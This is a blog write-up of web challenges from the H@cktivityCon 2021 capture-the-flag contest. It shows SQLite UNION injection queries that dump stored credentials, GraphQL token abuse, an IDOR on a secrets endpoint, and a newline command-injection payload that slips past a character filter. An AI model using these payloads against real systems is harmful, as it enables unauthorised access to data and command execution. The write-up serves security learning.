---
layout: post
title:  H@cktivityCon CTF 2021  Web Challenges Writeup                               # Title of the page
hide_title: false                                  # Hide the title when displaying the post, but shown in lists of posts
feature-img: "assets/img/writeups/Hackcon/abu_index.png"              # Add a feature-image to the post
thumbnail: "assets/img/writeups/Hackcon/abu_index.png"  # Add a thumbnail image on blog view
color: dufault                            # Add the specified color as feature image, and change link colors in post
bootstrap: true                                   # Add bootstrap to the page
author: abdoghazy
excerpt_separator: <!--more-->
tags: [ctf, writeup, Web]
---
<h1>H@cktivityCon CTF 2021  Web Challenges Writeup </h1>  
 <!--more-->

Hello All iam abdelhameed ghazy and this is my writeup for some web challenges in H@cktivityCon CTF 2021 

First challenge : All Backed Up    Level: Medium      sqlite_injection and graphql 
Desc : Grandma always knew how to make tried-and-true baked goods, and these recipes prove it!


<img src="https://github.com/0xL4ugh/0xl4ugh.github.io/raw/main/assets/img/writeups/Hackcon/abu_index.png" /> 

as we see there is four blogs about cakes so let's see any one of them
http://challenge.ctf.games:31353/post/Blackberry-Orange Cake

<img src="https://github.com/0xL4ugh/0xl4ugh.github.io/raw/main/assets/img/writeups/Hackcon/abu_somecake.png" /> 


as we see there is a endpoint called post and then there is another endpoint had the name of cake so let's try sqli 
http://challenge.ctf.games:31353/post/Blackberry-Orange Cake' or 1=1--
after i tried this it gives the first cake : 

<img src="https://github.com/0xL4ugh/0xl4ugh.github.io/raw/main/assets/img/writeups/Hackcon/abu_sqli1.png" /> 

so let's know the numbers of columns by ' order by 1 --
after incresing the number we got that we had  6 columns so let's use union to dump data 
http://challenge.ctf.games:31353/post/Blackberry-Orange' union select 1,2,3,4,5,6 --

the column 2,4,6  are reflected into the page so we will dump using them 
<img src="https://github.com/0xL4ugh/0xl4ugh.github.io/raw/main/assets/img/writeups/Hackcon/abu_sqli_column.png" /> 


first i used http://challenge.ctf.games:31353/post/Blackberry-Orange' union select 1,sqlite_version(),3,4,5,6 --

to make sure that's a sqlite so i tried to dump the columns from database by this 

http://challenge.ctf.games:31353/post/Blackberry-Orange' union select 1,sql,3,4,5,6 from sqlite_master limit 1,1 --
i found a table called posts so i ignored it and then i used this 
http://challenge.ctf.games:31353/post/Blackberry-Orange' union select 1,sql,3,4,5,6 from sqlite_master limit 2,1--
to get the second table (users)

<img src="https://github.com/0xL4ugh/0xl4ugh.github.io/raw/main/assets/img/writeups/Hackcon/abu_sqli_users.png" /> 
as you see there is a table called users had username,password  so let's dump the creds 

http://challenge.ctf.games:31353/post/Blackberry-Orange' union select 1,username,3,password,5,6 from users--

<img src="https://github.com/0xL4ugh/0xl4ugh.github.io/raw/main/assets/img/writeups/Hackcon/abu_sqli_creds.png" /> 
as you see we got the creds 

username :congon4tor   password : n8bboB!3%vDwiASVgKhv

and there is's no user else 

so i stuck here but after review requests i found a request sent to graphql and i didn't like it :( 

so i used graphql map : (it's  not a scanner i just use it to help me write my quiers eaisly)

<img src="https://github.com/0xL4ugh/0xl4ugh.github.io/raw/main/assets/img/writeups/Hackcon/abu_graphqlmap.png" /> 

python3 graphqlmap.py -u http://challenge.ctf.games:31353/graphql --method POST --json

and then i used dump_new command to view graphql contents 

<img src="https://github.com/0xL4ugh/0xl4ugh.github.io/raw/main/assets/img/writeups/Hackcon/abu_graphql_dump.png" /> 

as we see we had intersting stuff here 

Mutation called  (authenticateUser) took two parameters username and password both of them is string
Query called flag
token used in auth 

at first i tried to call flag qurey by this : {flag}
but it returned  :(error authenticating user: invalid token)

so by logic we need to use authenticateUser mutation to get token then used it to auth then call the flag query 

but for sorry i didn't know how to use it :( 
so i started searching how to use mutation and queries and Alhamdullah I got it 

first we will get the token by this command : mutation{authenticateUser(username:"congon4tor" password:"n8bboB!3%vDwiASVgKhv"){token}}

<img src="https://github.com/0xL4ugh/0xl4ugh.github.io/raw/main/assets/img/writeups/Hackcon/abu_sqli_token.png" /> 

nice !!! Now We got the token but didn't know how to use it to call the flag maybe it's a authorization header or we will send it in graphql parameter but after i switch on my browser tabs i found the github repo for graphqlmap it provide us to sent custom headers 
by this option : --headers

so, i exit graphql map and use this new command : 
python3 graphqlmap.py -u http://challenge.ctf.games:31353/graphql --method POST --json  --headers '{"Authorization" : "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImNvbmdvbjR0b3IiLCJleHAiOjE2MzIyMzI1NjEsImlhdCI6MTYzMjA1OTc2MSwiaXNzIjoiQ29uZ29uNHRvciJ9.WhAB-0xq54d4w4WT0cW2Ev8iozY-ASk0pQi2WGHDv-8"}'

and then called flag query {flag}

<img src="https://github.com/0xL4ugh/0xl4ugh.github.io/raw/main/assets/img/writeups/Hackcon/abu_flag.png" /> 


Second  challenge : OPA Secrets    Level: Hard      Flask Code Review , Idor  
Desc : OPA! Check out our new secret management service

After you read : i see it's a not hard challenge but any way let's see 

after signup & login we found that it takes secret 

opa_index 

while browsing i found the github repo that had the source code ;) 

so as always i see the changes in the files and no thing intersted either admin password and it's not working also xD 
but i found secret from admin called Flag and it's id 
<img src="https://github.com/0xL4ugh/0xl4ugh.github.io/raw/main/assets/img/writeups/Hackcon/oba_flagid.png" /> 

so let's see app.py  , as we see there is a endpoint called getValue that calls function called get_secret() 
<img src="https://github.com/0xL4ugh/0xl4ugh.github.io/raw/main/assets/img/writeups/Hackcon/oba_apppy.png" /> 

it sends post request to a locally host and get the secret so i tried secret id that we got and i got the flag xD

<img src="https://github.com/0xL4ugh/0xl4ugh.github.io/raw/main/assets/img/writeups/Hackcon/oba_flag.png" /> 


also we had an medium command injection  challenge that use sha256 command but  filters all special chars  (;&|) so i bypassed it by  : /n so my payload was 
flag.txt%0Acat flag.txt

